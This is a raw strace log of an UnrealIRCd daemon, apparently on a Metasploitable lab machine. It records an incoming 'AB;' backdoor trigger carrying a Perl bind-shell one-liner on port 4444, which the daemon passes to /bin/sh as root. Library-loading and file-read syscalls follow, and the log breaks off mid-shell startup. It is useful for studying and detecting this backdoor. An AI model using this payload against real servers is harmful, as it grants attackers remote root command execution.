4519  07:10:57.152322 select(1024, [2 3 4 7 9], [], NULL, {0, 980000}) = 1 (in [2], left {0, 800000})
4519  07:10:57.332960 clock_gettime(CLOCK_MONOTONIC, {1067, 149982494}) = 0
4519  07:10:57.332983 accept(2, 0, NULL) = 5
4519  07:10:57.333003 getpeername(5, {sa_family=AF_INET, sin_port=htons(44891), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:10:57.333036 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:10:57.333049 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:10:57.333110 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:10:57.333124 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:10:57.333136 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:10:57.333148 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:10:57.333163 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:10:57.333179 clock_gettime(CLOCK_MONOTONIC, {1067, 150192825}) = 0
4519  07:10:57.333192 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:10:57.333204 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:10:57.333270 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:10:57.333295 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:10:57.333306 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:10:57.333324 send(6, "\217+\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:10:57.333389 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:10:57.333443 gettimeofday({1495624257, 333447}, NULL) = 0
4519  07:10:57.333455 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {1, 0})
4519  07:10:57.336435 clock_gettime(CLOCK_MONOTONIC, {1067, 153456470}) = 0
4519  07:10:57.336457 recvfrom(6, "\217+\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0k\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:10:57.336501 close(6)          = 0
4519  07:10:57.336531 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:10:57.336546 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  07:10:57.336607 time(NULL)        = 1495624257
4519  07:10:57.336621 time(NULL)        = 1495624257
4519  07:10:57.336654 gettimeofday({1495624257, 336658}, NULL) = 0
4519  07:10:57.336683 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:10:57.336749 clock_gettime(CLOCK_MONOTONIC, {1067, 153762920}) = 0
4519  07:10:57.336761 gettimeofday({1495624257, 336765}, NULL) = 0
4519  07:10:57.336789 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 270000})
4519  07:10:58.069397 clock_gettime(CLOCK_MONOTONIC, {1067, 886420835}) = 0
4519  07:10:58.069450 recv(7, "PRIVMSG  #testit2 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 59
4519  07:10:58.069508 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.069528 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.069542 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.069556 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.069569 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.069583 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.069596 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.069610 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.069623 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.069636 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.069649 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.069671 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.069684 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.069697 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.069711 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.069724 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.069737 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.069750 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.069764 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.069777 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.069791 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.069804 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.069820 gettimeofday({1495624258, 69824}, NULL) = 0
4519  07:10:58.069832 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:10:58.069873 clock_gettime(CLOCK_MONOTONIC, {1067, 886885955}) = 0
4519  07:10:58.069897 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:10:58.069952 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:10:58.070005 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:10:58.070017 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:10:58.070032 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 5837
5837  07:10:58.070100 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
5837  07:10:58.070114 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
5837  07:10:58.070125 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5837  07:10:58.070138 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
5837  07:10:58.070242 brk(0)            = 0x80f9000
5837  07:10:58.070264 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5837  07:10:58.070281 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f73000
5837  07:10:58.070296 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
5837  07:10:58.070314 open("/etc/ld.so.cache", O_RDONLY) = 1
5837  07:10:58.070326 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5837  07:10:58.070344 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f6b000
5837  07:10:58.070355 close(1)          = 0
5837  07:10:58.070365 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5837  07:10:58.070393 open("/lib/libncurses.so.5", O_RDONLY) = 1
5837  07:10:58.070408 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
5837  07:10:58.070548 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
5837  07:10:58.070566 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f3b000
5837  07:10:58.070578 mmap2(0xb7f68000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f68000
5837  07:10:58.070595 close(1)          = 0
5837  07:10:58.070607 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5837  07:10:58.070621 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
5837  07:10:58.070635 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
5837  07:10:58.070723 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
5837  07:10:58.070739 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f37000
5837  07:10:58.070750 mmap2(0xb7f39000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f39000
5837  07:10:58.070769 close(1)          = 0
5837  07:10:58.070780 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5837  07:10:58.070794 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
5837  07:10:58.070807 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
5837  07:10:58.070934 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
5837  07:10:58.070969 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f36000
5837  07:10:58.070997 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7de7000
5837  07:10:58.071008 mmap2(0xb7f30000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f30000
5837  07:10:58.071026 mmap2(0xb7f33000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f33000
5837  07:10:58.071040 close(1)          = 0
5837  07:10:58.071062 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7de6000
5837  07:10:58.071074 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7de66b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
5837  07:10:58.071129 mprotect(0xb7f30000, 4096, PROT_READ) = 0
5837  07:10:58.071164 munmap(0xb7f6b000, 29913) = 0
5837  07:10:58.071189 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5837  07:10:58.071203 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
5837  07:10:58.071223 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd50f10) = -1 ENOTTY (Inappropriate ioctl for device)
5837  07:10:58.071252 brk(0)            = 0x80f9000
5837  07:10:58.071261 brk(0x80fa000)    = 0x80fa000
5837  07:10:58.071273 brk(0x80fb000)    = 0x80fb000
5837  07:10:58.071289 getuid32()        = 0
5837  07:10:58.071298 getgid32()        = 0
5837  07:10:58.071307 geteuid32()       = 0
5837  07:10:58.071316 getegid32()       = 0
5837  07:10:58.071329 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5837  07:10:58.071342 time(NULL)        = 1495624258
5837  07:10:58.071354 brk(0x80fc000)    = 0x80fc000
5837  07:10:58.071368 brk(0x80fd000)    = 0x80fd000
5837  07:10:58.071400 open("/proc/meminfo", O_RDONLY) = 1
5837  07:10:58.071449 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
5837  07:10:58.071484 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f72000
5837  07:10:58.071495 read(1, "MemTotal:      1035240 kB\nMemFree:        632664 kB\nBuffers:         63536 kB\nCached:         183736 kB\nSwapCached:          0 kB\nActive:         252136 kB\nInactive:       124104 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        632424 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            4552 kB\nWriteback:           0 kB\nAnonPages:      128984 kB\nMapped:          52004 kB\nSlab:            15132 kB\nSReclaimable:     7152 kB\nSUnreclaim:       7980 kB\nPageTables:       1952 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
5837  07:10:58.071576 close(1)          = 0
5837  07:10:58.071587 munmap(0xb7f72000, 4096) = 0
5837  07:10:58.071599 brk(0x80fe000)    = 0x80fe000
5837  07:10:58.071625 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
5837  07:10:58.071638 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
5837  07:10:58.071650 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
5837  07:10:58.071662 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
5837  07:10:58.071673 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
5837  07:10:58.071685 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
5837  07:10:58.071698 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5837  07:10:58.071710 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
5837  07:10:58.071722 uname({sys="Linux", node="metasploitable", ...}) = 0
5837  07:10:58.071769 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5837  07:10:58.071786 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
5837  07:10:58.071804 brk(0x8100000)    = 0x8100000
5837  07:10:58.071815 getcwd("/etc/unreal", 4096) = 12
5837  07:10:58.071829 getpid()          = 5837
5837  07:10:58.071845 getppid()         = 4519
5837  07:10:58.071861 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
5837  07:10:58.071893 stat64("/sbin/sh", 0xbfd50ee8) = -1 ENOENT (No such file or directory)
5837  07:10:58.071933 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
5837  07:10:58.071970 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
5837  07:10:58.071995 socket(PF_FILE, SOCK_STREAM, 0) = 1
5837  07:10:58.072009 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
5837  07:10:58.072035 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
5837  07:10:58.072056 close(1)          = 0
5837  07:10:58.072067 socket(PF_FILE, SOCK_STREAM, 0) = 1
5837  07:10:58.072077 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
5837  07:10:58.072087 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
5837  07:10:58.072105 close(1)          = 0
5837  07:10:58.072118 open("/etc/nsswitch.conf", O_RDONLY) = 1
5837  07:10:58.072132 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
5837  07:10:58.072148 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f72000
5837  07:10:58.072159 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
5837  07:10:58.072207 read(1, "", 4096) = 0
5837  07:10:58.072216 close(1)          = 0
5837  07:10:58.072225 munmap(0xb7f72000, 4096) = 0
5837  07:10:58.072242 open("/etc/ld.so.cache", O_RDONLY) = 1
5837  07:10:58.072254 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5837  07:10:58.072270 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f6b000
5837  07:10:58.072279 close(1)          = 0
5837  07:10:58.072290 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5837  07:10:58.072304 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
5837  07:10:58.072319 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
5837  07:10:58.072443 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
5837  07:10:58.072478 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ddd000
5837  07:10:58.072489 mmap2(0xb7de4000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7de4000
5837  07:10:58.072506 close(1)          = 0
5837  07:10:58.072517 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5837  07:10:58.072530 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
5837  07:10:58.072544 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
5837  07:10:58.072632 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
5837  07:10:58.072649 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dc5000
5837  07:10:58.072660 mmap2(0xb7dd9000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7dd9000
5837  07:10:58.072675 mmap2(0xb7ddb000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ddb000
5837  07:10:58.072689 close(1)          = 0
5837  07:10:58.072714 munmap(0xb7f6b000, 29913) = 0
5837  07:10:58.072730 open("/etc/ld.so.cache", O_RDONLY) = 1
